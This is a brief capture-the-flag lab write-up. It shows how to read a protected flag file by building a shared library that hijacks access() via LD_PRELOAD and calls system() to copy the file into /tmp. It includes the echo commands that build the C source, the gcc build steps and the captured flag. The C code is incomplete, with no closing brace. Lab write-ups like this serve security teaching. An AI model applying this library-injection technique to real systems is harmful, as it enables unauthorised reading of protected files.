# Steps

## 1 . Check for permissions
Firstly, we have to check the permissions in the home repository of the server - as indicated in the problem's instructions.

![](https://github.com/goncalo2k/FSI/blob/master/imgs/perms.png?raw=true)

After that, we realize that we can't directly read anything in the flags folder, but there's light at the end of the tunel: the user 'flag_reader' can read in that folder!

We also know that our user only has writing permissions in the /tmp diretctory. With this knowledge, we can:

1. Create a C file, named exploit.
    > touch exploit.c

2. After that, we inject into the file the script we're using to do a system() call, so that we can access the flax.txt file and output it into result.txt.
```cpp
echo "#include <fcntl.h>" > exploit.c
echo "#include <stdio.h>" >> exploit.c
echo "#include <stdlib.h>" >> exploit.c
echo "#include <unistd.h>" >> exploit.c
echo "#include <sys/types.h>" >> exploit.c
echo "int access(const char *pathname, int mode){" >> exploit.c
echo "    system(\"/usr/bin/cat /flags/flag.txt > /tmp/result.txt\");" >> exploit.c
```

3. Using the following line, you can make the exploit file be preloaded, in order to re-write the access() call.
> echo "LD_PRELOAD=/tmp/exploit.so" > env

4.  Using the newly re-written access call, you can now access the flag.txt file by compiling and executing the following command.
> gcc -fPIC -g -c exploit.c <br>
gcc -shared -o exploit.so exploit.o -lc <br>
chmod 777 result.txt

5. After that, you can use the cat command in order to check the result.txt file, where we will have the output of our vulnerability: the flag!
> *IN:* cat result.txt <br>
> *OUT:* Result: flag{6c396272a86850544b477b1c3750a351}





